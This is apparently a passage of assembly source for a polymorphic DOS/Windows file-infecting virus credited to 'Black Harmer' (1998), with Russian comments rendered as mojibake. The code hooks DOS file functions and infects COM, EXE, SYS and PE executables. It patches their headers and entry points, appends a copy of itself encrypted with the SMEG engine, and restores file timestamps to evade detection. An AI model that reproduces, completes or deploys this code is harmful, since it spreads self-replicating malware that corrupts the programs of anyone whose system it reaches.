        call     give_length_without_virus             ;³
quit_clc_retf2:                                        ;³
        pop      es bx                                 ;³
        popf                                           ;³
        clc                                            ;³
        jmp      Lbusy4                                ;³
quit_stc_retf2:                                        ;³
        pop      es bx                                 ;³
        popf                                           ;³
        stc                                            ;³
Lbusy4: sti                                            ;³
        Retf     0002                                  ;³
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
other_funtions:
        ;‚ áâ¥ª¥ PUSHF
        call     set_our_int_24 ; ‘â ¢¨¬ ­ è¥ 24 ¯à¥àë¢ ­¨¥
        cmp      ax,4b00h       ; ‚ë¯®«­¨âì ä ©«
        jnz      rename_move_file
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;ˆ­ä¨æ¨p®¢ ­¨¥ ¯p¨ § ¯ãáª¥                             ;³
        call     Asciiz                                ;³
        cmp      byte ptr cs:[extention-virus],0       ;³
        jz       set_old_int_24_jmpint21               ;³
        cmp      byte ptr cs:[filename-virus],0        ;³
        jnz      antivirus_sucks                       ;³
        cmp      byte ptr cs:[filemask-virus],0        ;³
        jnz      antivirus_sucks                       ;³
        call     call_zaraza                           ;³
        jmp      set_old_int_24_jmpint21               ;³
antivirus_sucks:                                       ;³
        cmp      byte ptr cs:[filename-virus],5        ;³
        ja       set_old_int_24_jmpint21               ;³
        cmp      byte ptr cs:[filemask-virus],3        ;³
        jbe      anti_mem                              ;³
        jmp      set_old_int_24_jmpint21               ;³
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
rename_move_file:
        cmp      ah,56h     ;¥p¥¨¬¥­®¢ âì ¯¥p¥¬¥áâ¨âì ä ©«
        jz       infected_fnc21
        cmp      ah,3dh     ;âªpëâì ®¯¨á â¥«ì ä ©« 
        jz       infected_fnc21
        cmp      ah,43h     ;¯p®á  âp¨¡ãâ  ä ©« 
        jnz      create_file
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;¥p¥¨¬¥­®¢ âì/¯¥p¥¬¥áâ¨âì ä ©«                        ;³
;âªpëâì ä ©«                                          ;³
;‡ ¯p®á  âp¨¡ãâ  ä ©«                                  ;³
infected_fnc21:                                        ;³
        call     Asciiz                                ;³
        cmp      byte ptr cs:[extention-virus],0       ;³
        jz       set_old_int_24_jmpint21               ;³
        cmp      byte ptr cs:[filename-virus],0        ;³
        jnz      set_old_int_24_jmpint21               ;³
        cmp      byte ptr cs:[filemask-virus],0        ;³
        jz       infected_fnc21_call_zaraza            ;³
        cmp      byte ptr cs:[filemask-virus],4        ;³
        jnz      set_old_int_24_jmpint21               ;³
infected_fnc21_call_zaraza:                            ;³
        call     call_zaraza                           ;³
        jmp      set_old_int_24_jmpint21               ;³
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
create_file:
        cmp      ah,5bh
        jz       infected_after_5b_3c
        cmp      ah,3ch
        jnz      close_file_handle_obr21
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;”ã­ªæ¨ï 5B á®§¤ âì ­®¢ë© ä ©«                         ;³
;”ã­ªæ¨ï 3C á®§¤ âì ®¯¨á â¥«ì ä ©«                     ;³
infected_after_5b_3c:                                  ;³
        popf                  ;®¤­ï«¨ ä« £¨           ;³
        call     call_int_21  ;‘®§¤ «¨ ä ©«            ;³
        push_all_register_withf                        ;³
        jc       set_old_int_24_popallf_retf2          ;³
        zero_es                                        ;³
        mov      word ptr es:[for_5b_3c_handle-begin_manager+address_of_manager_in_memory],ax
        mov      di,offset(for_5b_3c_file_name-begin_manager+address_of_manager_in_memory)
        mov      si,dx                                 ;³
        mov      cx,size for_5b_3c_file_name           ;³
        rep      movsb ;DS:[SI] -> ES:[DI]             ;³
        jmp      set_old_int_24_popallf_retf2          ;³
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
close_file_handle_obr21:
        cmp      ah,3eh ;‡ ªpëâì ®¯¨á â¥«ì ä ©« 
        jnz      set_old_int_24_jmpint21
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
        push     ds                                    ;³
        zero_ds                                        ;³
        cmp      bx,word ptr ds:[for_5b_3c_handle-begin_manager+address_of_manager_in_memory]
        jz       zaraza3e                              ;³
        pop      ds                                    ;³
        jmp      set_old_int_24_jmpint21               ;³
zaraza3e:                                              ;³
        pop      ds                                    ;³
        popf                                           ;³
        call     call_int_21                           ;³
        push_all_register_withf                        ;³
        zero_ds                                        ;³
        mov      dx,offset(for_5b_3c_file_name-begin_manager+address_of_manager_in_memory)
        call     Asciiz                                ;³
        cmp      byte ptr cs:[extention-virus],0       ;³
        jz       set_old_int_24_popallf_retf2          ;³
        cmp      byte ptr cs:[filename-virus],0        ;³
        jnz      set_old_int_24_popallf_retf2          ;³
        cmp      byte ptr cs:[filemask-virus],0        ;³
        jnz      set_old_int_24_popallf_retf2          ;³
        call     call_zaraza                           ;³
set_old_int_24_popallf_retf2:                          ;³
        call     set_old_int_24 ; ‘â ¢¨¬ áâ p®¥ 24-®¥ ¯p¥pë¢ ­¨¥
        pop_all_register_withf                         ;³
        sti                                            ;³
        retf     0002                                  ;³
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
set_old_int_24_jmpint21:
        call     set_old_int_24 ; ‘â ¢¨¬ áâ p®¥ 24'®¥ ¯à¥àë¢ ­¨¥
        ;‚ áâ¥ª¥ FLAGS
        popf
        jmp      dword ptr cs:[place_of_int21-virus+1]
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ ZARAZA ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
call_zaraza:
        push_all_register
        call     void_atr
        jc       pop_all_reg_and_retn
        mov      ax,3d02h       ; âªpëâì ä ©« ¤«ï çâ¥­¨ï/§ ¯¨á¨
        call     call_int_21
        jc       cannot_take_handle
        push     dx ds
        mov      cs:[place_of_handle-virus+1],ax
        ; ¯¨á â¥«ì åp ­¨âáï á¤¥áì (§ ¯®¬­¨âì ®¡ï§ â¥«ì­®)
        call     common_infected
        call     close_file_handle
        pop      ds dx
cannot_take_handle:
        call     set_old_atr
pop_all_reg_and_retn:
        pop_all_register
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
common_infected:
        mov      bp,sp
        call     set_dses_cs
        call     check_on_allredy_virused_with_take_time
        jc       infect_error          ; “¦¥ § p ¦¥­
        mov      word ptr ds:[bx],ax   ; ‚ AX ¢p¥¬ï (§ p ¦¥­­®¥)
        call     set_lseek_begin       ;Š ç ¥¬ 1Ch ¯¥p¢ëå ¡ ©â ¢ OLD ¡ãä¥p
        mov      cx,1ch
        mov      dx,offset(old_first_1c_byte-virus)
        push     dx  ;1
        call     read_file_through_handle
        jc       infect_error
        cmp      byte ptr ds:[filemask-virus],4 ;PE File
        jz       goto_infect_PE_file
        ;¥p¥áë« ¥¬ ¢á¥ á®¤¥p¦¨¬®¥ OLD ¢ NEW
        xchg     si,dx
        mov      di,offset(new_first_1c_byte-virus)
        rep      movsb ;DS:[SI] -> ES:[DI]
        call     set_lseek_end
        mov      di,dx
        mov      si,ax
                 ; DI:SI - ­  ª®­æ¥ ä ©« 
        pop      bx  ;1         ; ‚ BX á¬¥é¥­¨¥ OLD ¡ãä¥p 
        cmp      word ptr [bx],0ffffh ; „p ©¢¥p ãáâp®©áâ¢  SYS
        jz       go_infect_sys
        cmp      word ptr [bx],'ZM'
        jz       go_infec_exe   ;â®â ä ©« EXE - ˆ¤¥¬ ­  § p ¦¥­¨¥ EXE
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ COM ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
        cmp      byte ptr ds:[extention-virus],2 ;2-SYS file
        jz       infect_error
        ;ˆ¤¥¬ áî¤  ¥á«¨ ã ä ©«  p áè¨p¥­¨¥ COM ¨«¨ EXE.
        mov      byte ptr ds:[extention-virus],1 ;1-COM file
        ;®¬¥â¨¬ çâ® íâ® COM ä ©« (­ã¦­®)!
        cmp      ax,0ffffh-offset(endvirus-virus+size buffer_for_SMEG_decryptor+300h) ;
        jae      infect_error
        cmp      ax,size buffer_for_SMEG_decryptor ;
        ;- ” ©«ë ¬¥­ìè¥ íâ®£® p §¬¥p  ­¥ § p ¦ ¥¬
        jbe      infect_error
        ;‚å®¤­ë¥ ¯ p ¬¥âpë ¤«ï encrypt_blok
        mov      bx,ds:[place_of_handle-virus+1]
        mov      dx,ax
        mov      ax,20h
        pusha
        call     set_lseek_begin
        popa
        call     encrypt_blok
        mov      bx,offset(new_first_1c_byte-virus)
        mov      byte ptr ds:[bx],0e9h
        mov      ds:[bx+01],dx
        sub      word ptr ds:[bx+01],3
        mov      bx,offset(old_first_1c_byte-virus)
        mov      word ptr ds:[bx+0ah],0
        mov      word ptr ds:[bx+16h],0fff0h ;CS
        mov      word ptr ds:[bx+14h],0100h  ;IP
        ;‚¥è ¥¬ SMEG ­  ä ©«
        mov      ax,dx
        add      ax,offset(antivirus_break_block_end-antivirus_break_block+100h)
        call     crypt_virus_and_write_to_end
write_new1c_and_end:
        call     set_lseek_begin
        mov      cx,01ch
        mov      dx,offset(new_first_1c_byte-virus)
        call     write_to_file_through_handle
        jc       infect_error
set_time_of_file_and_exit:
        call     set_time_of_file
infect_error:
        mov      sp,bp
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ EXE ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;H  ¢å®¤¥ ¬ë ¨¬¥¥¬:
;BX=OLD buffer
;DS=ES=CS
;ãä¥p OLD § ¯®«­¥­ 1C ¡ ©â ¬¨ ¨§ ­ ç «  ä ©« 
;DI:SI - ­  ª®­æ¥ ä ©« 
go_infec_exe:
;‘­ ç «® ¯p®¢¥p¨¬ á®¤¥p¦¨â-«¨ EXE'¨ª ®¢¥p«¥¨ ¨ ¥á«¨ ¤ , â® ­¥ § p ¦ ¥¬.
        cmp      byte ptr ds:[extention-virus],2
        jz       infect_error
        ;ˆ¤¥¬ áî¤ , ¥á«¨ ã ä ©«  p áè¨p¥­¨¥ COM ¨«¨ EXE.
        mov      byte ptr ds:[extention-virus],3
        ;®¬¥â¨¬ çâ® íâ® EXE ä ©« (­ã¦­®)!
        mov      ax,[bx+4]   ;„«¨­­  ®¡p §  ¢ 512-¨ ¡ ©â®¢ëå áâp ­¨æ å
        mov      cx,200h
        mul      cx
        sub      ax,200h
        sbb      dx,0
        add      ax,[bx+2]
        adc      dx,0
        cmp      si,ax
        jnz      infect_error
        cmp      di,dx
        jnz      infect_error
        ; ” ©« ­¥ á®¤¥p¦¨â ®¢¥p«¥¨
        mov      ax,[bx+8]    ;„«¨­­  § £®«®¢ª  ¢ ¯ p £p ä å
        mov      cx,10h
        mul      cx
        sub      si,ax
        sbb      di,dx
        ;DI:SI - „«¨­­  ä ©«  ¡¥§ § £®«®¢ª 
        call     set_lseek_to_exe_without_header
        mov      cx,4
        mov      dx,offset(common_buffer-virus)
        call     read_file_through_handle
        ;p®¢¥p¨¬ íâ® EXE ¤p ©¢¥p, ¥á«¨ ¤  â® ­¥ § p ¦ ¥¬!
        cmp      word ptr ds:[common_buffer-virus],0ffffh
        jnz      infect_link
        cmp      word ptr ds:[common_buffer-virus+2],0ffffh
        jz       infect_error
        cmp      word ptr ds:[common_buffer-virus+2],0
        jz       infect_error
infect_link:
        mov      dx,0fffeh
        or       di,di
        jnz      big_exe_file_present
        cmp      si,size buffer_for_SMEG_decryptor ;
        jc       infect_error
        mov      dx,si
big_exe_file_present:
        ; p ¬¥âpë ¤«ï encrypt_blok
        call     set_lseek_to_exe_without_header
        mov      bx,ds:[place_of_handle-virus+1h]
        mov      ax,20h
        call     encrypt_blok
        mov      bx,offset(new_first_1c_byte-virus)
        ;DI:SI - ¤«¨­­  ä ©«  ¡¥§ § £®«®¢ª 
        mov      dx,di
        mov      ax,si
        mov      cx,10h
        div      cx
        push     dx
        mov      [bx+16h],ax     ;Relo CS
        mov      [bx+14h],dx     ;IP
        add      dx,offset(endvirus-virus+size buffer_for_SMEG_decryptor+300h) ;
        adc      ax,0
        mov      [bx+0eh],ax     ;Relo SS
        mov      [bx+10h],dx     ;Sp
        mov      word ptr [bx+06h],0
        mov      ax,030h
        cmp      [bx+0ah],ax     ;Œ¨­¨¬ã¬ âp¥¡ã¥¬®© ¯ ¬ïâ¨ §  ª®­æ®¬ ¯p®£p ¬¬ë
        jae      min_mem_above_then_30
        mov      [bx+0ah],ax
min_mem_above_then_30:
        cmp      [bx+0ch],ax
        jae      max_mem_above_then_30
        mov      [bx+0ch],ax     ;Œ ªá¨¬ã¬ âp¥¡ã¥¬®© ¯ ¬ïâ¨ §  ª®­æ®¬ ¯p®£p ¬¬ë
max_mem_above_then_30:
        pop      ax
        add      ax,offset(antivirus_break_block_end-antivirus_break_block)
        call     crypt_virus_and_write_to_end
        call     set_lseek_end ;‚ëå®¤: DX:AX - ­  ª®­æ¥ BX - Handle
        mov      cx,200h
        div      cx
        inc      ax
        mov      bx,offset(new_first_1c_byte-virus)
        mov      word ptr ds:[bx+04h],ax
        mov      word ptr ds:[bx+02h],dx
        jmp      write_new1c_and_end
;®¤¯p®£p ¬¬  ãáâ ­ ¢«¨¢ ¥â ãª § â¥«ì ­  ­ ç «® EXE ä ©«  ¡¥§ § £®«®¢ª 
set_lseek_to_exe_without_header proc near
        pusha
        mov      ax,[bx+8]    ;„«¨­­  § £®«®¢ª  ¢ ¯ p £p ä å
        mov      cx,10h
        mul      cx
        mov      cx,dx
        mov      dx,ax
        call     set_lseek_begin_pluscxdx
        popa
        retn
set_lseek_to_exe_without_header endp
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ SYS ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
go_infect_sys:
        ;à®¢¥à¨¬ ­¥ á«¨èª®¬ «¨ ¡®«ìè®£® à §¬¥à  ­ è ¤à ©¢¥à.
        ;(„®«¦¥­ ¡ëâì ¢¬¥áâ¥ á ¢¨àãá®¬ ­¥ ¡®«¥¥ 64Š.)
        cmp      byte ptr ds:[extention-virus],2
        ;â® ¤¥©áâ¢¨â¥«ì­® SYS ä ©« ?
        jnz      infect_error
        or       di,di
        jnz      infect_error
        cmp      si,0ffffh-offset(endvirus-virus+size buffer_for_SMEG_decryptor+300h)
        jae      infect_error
        cmp      si,size buffer_for_SMEG_decryptor ;
        jbe      infect_error
        mov      word ptr ds:[new_first_1c_byte-virus+6],si
                                                 ; Œ¥­ï¥¬ § £®«®¢®ª (Strategy)
        call     set_lseek_begin
        mov      ax,20h
        mov      dx,si
        mov      bx,ds:[place_of_handle-virus+1h]
        call     encrypt_blok
        mov      ax,si
        add      ax,offset(antivirus_break_block_end-antivirus_break_block)
        call     crypt_virus_and_write_to_end
        jmp      write_new1c_and_end
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ PE ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
goto_infect_PE_file:
        cmp      byte ptr ds:[extention-virus],3
        jnz      infect_error
        mov      byte ptr ds:[extention-virus],4
        call     set_lseek_begin
        mov      cx,40h
        mov      dx,offset(common_buffer-virus)
        call     read_file_through_handle
        mov      si,dx
        xor      cx,cx
        mov      dx,word ptr ds:[si+3ch]
        mov      ds:[PE_EXE_header_point-virus],dx
        call     set_lseek_begin_pluscxdx
        mov      cx,60h
        mov      dx,offset(PE_EXE_header-virus)
        call     read_file_through_handle
        mov      ax,word ptr ds:[PE_EXE_header-virus+6]
;# OBJECTS = DW Number of object entries.
;This field specifies the number of entries in the Object Table.
        dec      ax
        mov      cx,40d
        mul      cx
        add      ax,18h
        add      ax,word ptr ds:[PE_EXE_header-virus+14h] ;+NT_Header_size
        add      ax,word ptr ds:[PE_EXE_header_point-virus]
        mov      ds:[obj_point-virus],ax       ;ãª § â¥«ì ­  ¯®á«¥¤­¨© ®¡ê¥ªâ
        xor      cx,cx
        mov      dx,ax
        call     set_lseek_begin_pluscxdx
        mov      cx,40d
        mov      dx,offset(WIN_object-virus)
        call     read_file_through_handle         ;¯p®ç¨â ¥¬ ¯®á«¥¤­¨© ®¡ê¥ªâ
.386
        ;--------------------------------------------------------------------
        ;‘®åp ­ï¥¬ áâ pë© RVA Entrypoint
        mov      eax,dword ptr ds:[PE_EXE_header-virus+28h]
;ENTRYPOINT RVA = DD Entrypoint relative virtual address.
;The address is relative to the Image Base.  The address is the
;starting address for program images and the library initialization
;and library termination address for library images.
        add      eax,dword ptr ds:[PE_EXE_header-virus+34h]
;IMAGE BASE = DD The virtual base of the image.
;This will be the virtual address of the first byte of the file (Dos
;Header).
        mov      dword ptr ds:[RVA_sub-virus],eax
                                                ;p¨£¨­ «ì­ë© RVA_Entrypoint
        ;--------------------------------------------------------------------
        ;“áâ ­ ¢«¨¢ ¥¬ á¢®© RVA Entrypoint
        mov      eax,dword ptr ds:[WIN_object-virus+0ch] ;RVA ®¡ì¥ªâ 
        add      eax,dword ptr ds:[WIN_object-virus+10h] ;PHYS Size
        mov      dword ptr ds:[PE_EXE_header-virus+28h],eax
                                                  ;­®¢ë© RVA_Entrypoint
        ;--------------------------------------------------------------------
        ;Šã¤  ¢¨pãá ¡ã¤¥¬ ¯¨á âì
        xor      edx,edx
        mov      eax,dword ptr ds:[WIN_object-virus+14h] ;PHYS OFFSET
        add      eax,dword ptr ds:[WIN_object-virus+10h] ;PHYS SIZE
        mov      ecx,10000h
        div      ecx  ;EDX:EAX/ECX -> EAX:EDX
.286
        push     dx
        push     ax
.386
        ;--------------------------------------------------------------------
        ;¥¤ ªâ¨pã¥¬ VIRTUAL SIZE of Object
        xor      edx,edx
        mov      eax,dword ptr ds:[WIN_object-virus+8h]     ;VIRTUAL SIZE
        add      eax,offset(end_win_virus-begin_win_virus+50h+endvirus-virus+size common_buffer)
        mov      ecx,dword ptr ds:[PE_EXE_header-virus+38h] ;OBJECT ALIGN
        div      ecx
        inc      eax
        mul      ecx
        mov      dword ptr ds:[WIN_object-virus+8h],eax
        ;--------------------------------------------------------------------
        ;¥¤ ªâ¨pã¥¬ PHYSICAL SIZE of Object
        xor      edx,edx
        mov      eax,dword ptr ds:[WIN_object-virus+10h]   ;PHYS SIZE
        add      eax,offset(end_win_virus-begin_win_virus+50h+endvirus-virus+size common_buffer)
        mov      ecx,dword ptr ds:[PE_EXE_header-virus+3ch];FILE ALIGN
        div      ecx
        inc      eax
        mul      ecx
        mov      dword ptr ds:[WIN_object-virus+10h],eax
        ;-------------------------------------------------------------------
        ;¥¤ ªâ¨pã¥¬ IMAGE SIZE
        mov      eax,dword ptr ds:[WIN_object-virus+0ch]    ;RVA OBJECT
        add      eax,dword ptr ds:[WIN_object-virus+8h]     ;VIRTUAL SIZE
        mov      dword ptr ds:[PE_EXE_header-virus+50h],eax ;IMAGE SIZE
        ;--------------------------------------------------------------------
        mov      dword ptr ds:[WIN_object-virus+24h],0e0000040h
        ;--------------------------------------------------------------------
.286
        xor      cx,cx
        mov      dx,ds:[PE_EXE_header_point-virus]
        call     set_lseek_begin_pluscxdx
        mov      cx,60h
        mov      dx,offset(PE_EXE_header-virus)
        call     write_to_file_through_handle
        xor      cx,cx
        mov      dx,word ptr ds:[obj_point-virus]
        call     set_lseek_begin_pluscxdx
        mov      cx,40d
        mov      dx,offset(WIN_object-virus)
        call     write_to_file_through_handle
        pop      cx
        pop      dx
        call     set_lseek_begin_pluscxdx
        mov      cx,offset(end_win_virus-begin_win_virus)
        mov      dx,offset(begin_win_virus-virus)
        call     write_to_file_through_handle ;¨è¥¬ 32'ãå ¡¨â­ë© ¬®¤ã«ì
        mov      cx,50h ;32'ãå ¡¨â­ë¬ ¬®¤ã«¥¬ íâ® ¡ã¤¥â ¨á¯®«ì§®¢ âìáï ¤«ï
                        ;¡ãä¥p®¢
        call     write_to_file_through_handle
        mov      ax,offset(antivirus_break_block_end-antivirus_break_block+100h)
        call     crypt_virus_and_write_to_current ;¨è¥¬ ¢¨pãá ª ª ¡«®ª ¤ ­­ëå
        jmp      set_time_of_file_and_exit
; ƒ«®¡ «ì­®¥ ¬¥áâ® ¤«ï ¯®¤¯p®£p ¬¬ 
;®¤¯p®£p ¬¬  ¤¥â¥ªâ¨p®¢ ­¨ï ä ©«  (c)'98 Black Harmer
;ˆá¯®«ì§ã¥âáï ¢¨pãá ¬¨ ¤«ï ®¯p¥¤¥«¥­¨ï ª ª®© ä ©« ¬®¦­® § p ¦ âì,  
;ª ª®© ­¥«ì§ï.
;‚å®¤:  DS:DX - ãª §ë¢ ¥â ­  áâp®ªã ¢ ä®p¬¥: "¤¨áª:\¯ãâì\¨¬ï ä ©« ",0
;       „®«¦­  ¡ëâì ®¯p¥¤¥«¥­  ¯®¤¯p®£p ¬¬  call_int_21, å®âï ¡ë ¢®â â ª®£®
;       á®¤¥p¦ ­¨ï:
;       call_int_21 proc near
;       int   21h
;       retn
;       call_int_21 endp
;‚ëå®¤: ‘¬®âp¨â¥ ®¯¨á ­¨¥ ª ¯¥p¥¬¥­­ë¬:
;       1) filename
;       2) extention
;       3) filemask
include asciiz.asm
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;p®£p ¬¬ë ®¡p ¡®âª¨ á«ãç ©­ëå ç¨á¥«
;‚å®¤:  call random_any_ax (‚®p ç¨¢ ¥â «î¡®¥ á«ãç ©­®¥ ç¨á«® ¢ AX)
;       call random_ax („«ï ¢å®¤  ­ã¦¥­ AX, ­  ¢ëå®¤¥ 0<NEW_AX<=OLD_AX)
;‚å®¤:  call random_any_dx (‚®p ç¨¢ ¥â «î¡®¥ á«ãç ©­®¥ ç¨á«® ¢ DX)
;       call random_dx („«ï ¢å®¤  ­ã¦¥­ DX, ­  ¢ëå®¤¥ 0<NEW_DX<=OLD_DX)
include random.asm
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;‘®§¤ â¥«ì p áè¨äp®¢é¨ª®¢ â¨¯  SMEG
;‚å®¤: call smeg
;‚å®¤­ë¥ ¯ p ¬¥âpë:
include smeg.asm
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; p ¬¥âpë:  ds ¤®«¦¥­ ¡ëâì p ¢¥­ cs
;ˆá¯®«ì§ã¥â: ds:[targetptr-virus]    - ªã¤  ¡ã¤¥¬ áª« ¤ë¢ âì p¥§ã«ìâ â
;            ds:[sourceptr-virus]    - á¬¥é¥­¨¥ ®â ªã¤  ­ ç âì è¨äp®¢ âì
;            ds:[datasize-virus]     - p §¬¥p ¤ ­­ëå
;            ds:[cryptval-virus]     - ¡ ©â è¨äp®¢ª¨ (¨¬ ¡ã¤¥¬ è¨äp®¢ âì)
;‚á¥ p¥£¨áâpë ¯®á«¥ ¢ëå®¤  á®åp ­¥­ë
include encrypt.asm
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;˜¨äp®¢ª /p áè¨äp®¢ª  ¡«®ª®¢
include endeb.asm
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;‚å®¤: AX - Initial IP
crypt_virus_and_write_to_current:
        push_all_register
        mov      di,offset(buffer_for_SMEG_decryptor-virus)
        mov      cx,size buffer_for_SMEG_decryptor
@@clearing:
        mov      byte ptr ds:[di],0
        inc      di
        loop     @@clearing
        jmp      write_smeg_to_current
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;‚å®¤: AX - Initial IP
crypt_virus_and_write_to_end:
        push_all_register
        ;p®ç¨â ¥¬ ¢ ¡ãää¥p ¨§ ª®­æ  ä ©« 
        push     ax
        call     set_lseek_end ;VERY NEED
        sub      ax,size buffer_for_SMEG_decryptor ;
        sbb      dx,0
        mov      cx,dx
        mov      dx,ax
        call     set_lseek_begin_pluscxdx
        mov      cx,size buffer_for_SMEG_decryptor ;
        mov      dx,offset(buffer_for_SMEG_decryptor-virus)
        call     read_file_through_handle
        call     set_lseek_end
        ;‘®§¤ ¤¨¬ p áè¨äp®¢é¨ª
        pop      ax
write_smeg_to_current:
        mov      di,offset(buffer_for_SMEG_decryptor-virus)
        xor      dx,dx
        mov      cx,offset(endvirus-virus)
        call     SMEG
        ;H  ¢ëå®¤¥: DS=CS, BP ¯p¥¦­¥¥
        ;áâ «ì­ë¥ p¥£¨áâpë ã¡¨âë
        mov      cx,offset(antivirus_break_block_end-antivirus_break_block)
        mov      dx,offset(antivirus_break_block-virus)
        call     write_to_file_through_handle ;“ª § â¥«ì ã¦¥ ­  ª®­æ¥
        mov      cx,ds:[decryptor_size-virus]
        mov      dx,offset(buffer_for_SMEG_decryptor-virus)
        call     write_to_file_through_handle ;“ª § â¥«ì ã¦¥ ­  ª®­æ¥
        mov      ds:[targetptr-virus],offset(buffer_for_crypted_virus-virus)
        call     encrypt
        mov      cx,ds:[datasize-virus]
        mov      dx,offset(buffer_for_crypted_virus-virus)
        call     write_to_file_through_handle
        mov      cx,size buffer_for_SMEG_decryptor   ;
        sub      cx,ds:[decryptor_size-virus]
        jc       pop_all_reg_and_retn
        mov      dx,offset(buffer_for_SMEG_decryptor-virus)
        add      dx,ds:[decryptor_size-virus]
        call     write_to_file_through_handle
        jmp      pop_all_reg_and_retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
antivirus_break_block:
        push_all_register
        mov      ah,2
        mov      dl,40h
        int      21h
antivirus_break_block_end:
